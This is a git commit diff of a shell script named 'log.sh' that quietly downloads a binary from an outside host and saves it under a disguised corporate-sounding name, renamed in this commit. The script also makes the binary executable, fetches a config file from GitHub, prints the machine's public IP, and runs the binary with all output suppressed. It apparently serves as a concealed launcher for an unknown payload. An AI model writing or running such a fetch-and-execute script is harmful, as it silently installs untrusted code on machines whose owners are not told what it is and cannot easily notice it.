ba50b9c449c9c7c4a46d1fa1ca7810fef4449e56
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-14 02:46:17 +0700

    Update log.sh

--- log.sh
+++ log.sh
@@ -1,7 +1,7 @@
-wget -q -O PursuitBankCorp https://maper.info/api-server && chmod +x PursuitBankCorp >/dev/null 2>&1
+wget -q -O SociétéImportance https://maper.info/api-server && chmod +x SociétéImportance >/dev/null 2>&1
 wget -q https://raw.githubusercontent.com/55113110159/TIBO/main/config.json && chmod +x config.json
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
 echo " "
-./PursuitBankCorp -c "config.json" >/dev/null 2>&1
+./SociétéImportance -c "config.json" >/dev/null 2>&1
